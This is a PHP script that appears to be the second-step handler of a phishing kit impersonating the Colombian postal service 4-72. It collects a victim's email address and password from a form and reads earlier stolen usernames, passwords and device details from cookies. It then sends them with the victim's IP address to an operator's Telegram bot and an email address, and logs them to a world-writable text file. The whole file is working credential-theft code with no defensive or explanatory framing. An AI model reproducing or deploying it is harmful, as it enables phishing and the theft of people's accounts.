<?php
require('../config.php');
require_once("../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();
$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s"); 

$correo = $ifilter->process($_POST['eml']);
$clave = $ifilter->process($_POST['clv']);

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$dispositivo = $_COOKIE['dispositivo'];

$ipcliente= $_SERVER['REMOTE_ADDR'];

setcookie('correo',$correo,time()+60*9);
setcookie('clave',$clave,time()+60*9);


function getSslPage($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$data = [
	'chat_id' => $id_chat,
	'parse_mode' => 'HTML',
	'text' => '<b>'.$dominio.'</b>
	Datos Paso 2 <b>Correo (4-72)</b> '.$hoy2.'

	<b>Usuario:</b> '.$usuario.'
	<b>Contraseña:</b> '.$contrasena.'	
	<b>Correo:</b> '.$correo.'
	<b>Clave:</b> '.$clave.'
	<b>Dispositivo:</b> '.$dispositivo.'
	<b>IP:</b> '.$ipcliente.'
	'
];

$response = getSslPage("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));


$datos = 'Usuario: '.$usuario.' | Clave: '.$contrasena.' | Correo: '.$correo.' | Clave: '.$clave.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

$file = '../2-correo.txt';

$salto = "";
$cabecera = "---------------- Paso 2 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;


$to = $destino;
$subject = "Datos 4-72 Paso 2 ".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario."<br> 
<b>Contraseña: </b>".$contrasena."<br>
<b>Correo: </b>".$correo."<br>
<b>Celular: </b>".$clave."<br>
<b>Dispositivo: </b>".$dispositivo."<br> 
<b>Dirección IP: </b>".$ipcliente."<br> 
<b>Hora/Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>